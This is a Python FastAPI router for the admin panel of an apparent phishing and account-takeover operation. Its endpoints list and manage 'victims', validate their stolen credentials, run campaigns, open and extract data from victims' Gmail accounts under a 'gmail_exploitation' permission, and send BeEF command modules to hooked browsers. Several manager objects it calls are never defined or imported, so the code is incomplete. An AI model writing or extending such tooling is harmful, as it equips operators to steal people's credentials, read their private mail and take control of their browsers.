"""
Admin Router
Admin dashboard, victim management, campaign control, Gmail access, BeEF control
"""

import logging
from datetime import datetime, timezone
from typing import Dict, Any, Optional, List

from fastapi import APIRouter, HTTPException, status, Request, Depends, Query
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from pydantic import BaseModel

from api.admin.dashboard import router as dashboard_router
from api.admin.victims import router as victims_router
from api.admin.campaigns import router as campaigns_router
from api.admin.gmail_access import router as gmail_access_router
from api.admin.beef_control import router as beef_control_router
from api.admin.activity_logs import router as activity_logs_router
from api.auth.jwt_handler import JWTHandler
from api.auth.permissions import PermissionManager

logger = logging.getLogger(__name__)

router = APIRouter()
security = HTTPBearer()

# Include sub-routers
router.include_router(dashboard_router, prefix="/dashboard", tags=["Dashboard"])
router.include_router(victims_router, prefix="/victims", tags=["Victims"])
router.include_router(campaigns_router, prefix="/campaigns", tags=["Campaigns"])
router.include_router(gmail_access_router, prefix="/gmail", tags=["Gmail Access"])
router.include_router(beef_control_router, prefix="/beef", tags=["BeEF Control"])
router.include_router(activity_logs_router, prefix="/activity", tags=["Activity Logs"])
jwt_handler = JWTHandler()
permission_manager = PermissionManager()

# Pydantic models
class DashboardStatsResponse(BaseModel):
    total_victims: int
    active_campaigns: int
    successful_captures: int
    high_value_targets: int
    system_health: Dict[str, Any]
    recent_activity: List[Dict[str, Any]]

class VictimListResponse(BaseModel):
    victims: List[Dict[str, Any]]
    total_count: int
    page: int
    page_size: int
    filters: Dict[str, Any]

class CampaignResponse(BaseModel):
    campaign_id: str
    name: str
    status: str
    created_at: datetime
    statistics: Dict[str, Any]

class GmailAccessRequest(BaseModel):
    victim_id: str
    access_method: str = "oauth"
    extraction_config: Dict[str, Any] = {}

class BeEFCommandRequest(BaseModel):
    hook_id: str
    command_module: str
    parameters: Dict[str, Any] = {}

# Dependency to get current admin user
async def get_current_admin(credentials: HTTPAuthorizationCredentials = Depends(security)):
    """Get current admin user from JWT token"""
    try:
        token_data = jwt_handler.decode_token(credentials.credentials)
        return {
            "id": token_data["sub"],
            "username": token_data["username"],
            "role": token_data["role"],
            "permissions": token_data["permissions"]
        }
    except Exception as e:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Invalid authentication credentials"
        )

# Dashboard endpoints
@router.get("/dashboard", response_model=DashboardStatsResponse)
async def get_dashboard_stats(
    admin_user: dict = Depends(get_current_admin)
):
    """Get dashboard statistics"""
    try:
        # Check permissions
        if not permission_manager.has_permission(admin_user, "dashboard_view"):
            raise HTTPException(
                status_code=status.HTTP_403_FORBIDDEN,
                detail="Insufficient permissions"
            )
        
        # Get dashboard statistics
        stats = dashboard_manager.get_overview()
        
        return DashboardStatsResponse(**stats)
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Dashboard stats error: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Internal server error"
        )

@router.get("/dashboard/realtime")
async def get_realtime_dashboard(
    admin_user: dict = Depends(get_current_admin)
):
    """Get real-time dashboard data"""
    try:
        # Check permissions
        if not permission_manager.has_permission(admin_user, "dashboard_view"):
            raise HTTPException(
                status_code=status.HTTP_403_FORBIDDEN,
                detail="Insufficient permissions"
            )
        
        # Get real-time data
        realtime_data = dashboard_manager.get_real_time_metrics()
        
        return realtime_data
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Realtime dashboard error: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Internal server error"
        )

# Victim management endpoints
@router.get("/victims", response_model=VictimListResponse)
async def get_victims(
    page: int = Query(1, ge=1),
    page_size: int = Query(50, ge=1, le=100),
    filters: Optional[str] = Query(None),
    admin_user: dict = Depends(get_current_admin)
):
    """Get victims list with pagination and filtering"""
    try:
        # Check permissions
        if not permission_manager.has_permission(admin_user, "victim_management"):
            raise HTTPException(
                status_code=status.HTTP_403_FORBIDDEN,
                detail="Insufficient permissions"
            )
        
        # Parse filters
        filter_dict = {}
        if filters:
            # Simple filter parsing (in production, use proper query parsing)
            filter_dict = {"status": filters}
        
        # Get victims
        victims_data = await victim_manager.get_victims(
            page=page,
            page_size=page_size,
            filters=filter_dict,
            admin_user=admin_user
        )
        
        return VictimListResponse(**victims_data)
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Get victims error: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Internal server error"
        )

@router.get("/victims/{victim_id}")
async def get_victim_details(
    victim_id: str,
    admin_user: dict = Depends(get_current_admin)
):
    """Get detailed victim information"""
    try:
        # Check permissions
        if not permission_manager.has_permission(admin_user, "victim_management"):
            raise HTTPException(
                status_code=status.HTTP_403_FORBIDDEN,
                detail="Insufficient permissions"
            )
        
        # Get victim details
        victim_details = await victim_manager.get_victim_details(victim_id)
        
        if not victim_details:
            raise HTTPException(
                status_code=status.HTTP_404_NOT_FOUND,
                detail="Victim not found"
            )
        
        return victim_details
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Get victim details error: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Internal server error"
        )

@router.post("/victims/{victim_id}/validate")
async def validate_victim(
    victim_id: str,
    admin_user: dict = Depends(get_current_admin)
):
    """Validate victim credentials"""
    try:
        # Check permissions
        if not permission_manager.has_permission(admin_user, "victim_management"):
            raise HTTPException(
                status_code=status.HTTP_403_FORBIDDEN,
                detail="Insufficient permissions"
            )
        
        # Validate victim
        validation_result = await victim_manager.validate_victim(victim_id)
        
        return validation_result
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Validate victim error: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Internal server error"
        )

# Campaign management endpoints
@router.get("/campaigns")
async def get_campaigns(
    admin_user: dict = Depends(get_current_admin)
):
    """Get campaigns list"""
    try:
        # Check permissions
        if not permission_manager.has_permission(admin_user, "campaign_management"):
            raise HTTPException(
                status_code=status.HTTP_403_FORBIDDEN,
                detail="Insufficient permissions"
            )
        
        # Get campaigns
        campaigns = await campaign_manager.get_campaigns(admin_user["id"])
        
        return {"campaigns": campaigns}
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Get campaigns error: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Internal server error"
        )

@router.post("/campaigns")
async def create_campaign(
    campaign_data: Dict[str, Any],
    admin_user: dict = Depends(get_current_admin)
):
    """Create new campaign"""
    try:
        # Check permissions
        if not permission_manager.has_permission(admin_user, "campaign_management"):
            raise HTTPException(
                status_code=status.HTTP_403_FORBIDDEN,
                detail="Insufficient permissions"
            )
        
        # Create campaign
        campaign_id = await campaign_manager.create_campaign(
            campaign_data, 
            admin_user["id"]
        )
        
        return {"campaign_id": campaign_id, "message": "Campaign created successfully"}
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Create campaign error: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Internal server error"
        )

# Gmail access endpoints
@router.post("/gmail-access")
async def access_gmail(
    request: GmailAccessRequest,
    admin_user: dict = Depends(get_current_admin)
):
    """Access victim Gmail account"""
    try:
        # Check permissions
        if not permission_manager.has_permission(admin_user, "gmail_exploitation"):
            raise HTTPException(
                status_code=status.HTTP_403_FORBIDDEN,
                detail="Insufficient permissions"
            )
        
        # Access Gmail
        gmail_session = await gmail_access_manager.access_victim_gmail(
            victim_id=request.victim_id,
            admin_user_id=admin_user["id"],
            access_method=request.access_method,
            extraction_config=request.extraction_config
        )
        
        return {
            "success": True,
            "gmail_session": gmail_session,
            "message": "Gmail access established successfully"
        }
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Gmail access error: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Internal server error"
        )

@router.get("/gmail-access/{victim_id}/data")
async def get_gmail_data(
    victim_id: str,
    admin_user: dict = Depends(get_current_admin)
):
    """Get extracted Gmail data"""
    try:
        # Check permissions
        if not permission_manager.has_permission(admin_user, "gmail_exploitation"):
            raise HTTPException(
                status_code=status.HTTP_403_FORBIDDEN,
                detail="Insufficient permissions"
            )
        
        # Get Gmail data
        gmail_data = await gmail_access_manager.get_extracted_data(victim_id)
        
        return gmail_data
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Get Gmail data error: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Internal server error"
        )

# BeEF control endpoints
@router.get("/beef/hooks")
async def get_beef_hooks(
    admin_user: dict = Depends(get_current_admin)
):
    """Get BeEF hooked browsers"""
    try:
        # Check permissions
        if not permission_manager.has_permission(admin_user, "beef_control"):
            raise HTTPException(
                status_code=status.HTTP_403_FORBIDDEN,
                detail="Insufficient permissions"
            )
        
        # Get hooked browsers
        hooks = await beef_control_manager.get_hooked_browsers()
        
        return {"hooks": hooks}
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Get BeEF hooks error: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Internal server error"
        )

@router.post("/beef/execute")
async def execute_beef_command(
    request: BeEFCommandRequest,
    admin_user: dict = Depends(get_current_admin)
):
    """Execute BeEF command"""
    try:
        # Check permissions
        if not permission_manager.has_permission(admin_user, "beef_control"):
            raise HTTPException(
                status_code=status.HTTP_403_FORBIDDEN,
                detail="Insufficient permissions"
            )
        
        # Execute command
        result = await beef_control_manager.execute_command(
            hook_id=request.hook_id,
            command_module=request.command_module,
            parameters=request.parameters
        )
        
        return result
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Execute BeEF command error: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Internal server error"
        )

# Activity logs endpoints
@router.get("/activity-logs")
async def get_activity_logs(
    page: int = Query(1, ge=1),
    page_size: int = Query(50, ge=1, le=100),
    admin_user: dict = Depends(get_current_admin)
):
    """Get activity logs"""
    try:
        # Check permissions
        if not permission_manager.has_permission(admin_user, "activity_logs"):
            raise HTTPException(
                status_code=status.HTTP_403_FORBIDDEN,
                detail="Insufficient permissions"
            )
        
        # Get activity logs
        logs = await activity_log_manager.get_activity_logs(
            page=page,
            page_size=page_size,
            admin_user=admin_user
        )
        
        return logs
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Get activity logs error: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Internal server error"
        )
